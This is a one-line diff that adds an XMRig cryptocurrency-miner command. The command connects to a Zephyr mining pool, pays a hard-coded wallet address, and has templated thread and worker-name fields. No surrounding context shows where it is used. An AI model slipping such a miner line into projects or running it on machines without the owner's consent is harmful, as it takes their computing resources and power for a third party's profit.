@@ -1,0 +1,1 @@
+./xmrig -o sg-zephyr.miningocean.org:5342 --threads {threads} -u 47dBQdk3YUXFrcj5DDmtAz84iD9EB87VCWPDorJvF1ncezfdYymU7XGej7DEMXG4pc7mfYYNCHxH5jUcMwJPTcyNBRzP1eE -p {workername} -a rx/0 -k --donate-level 1
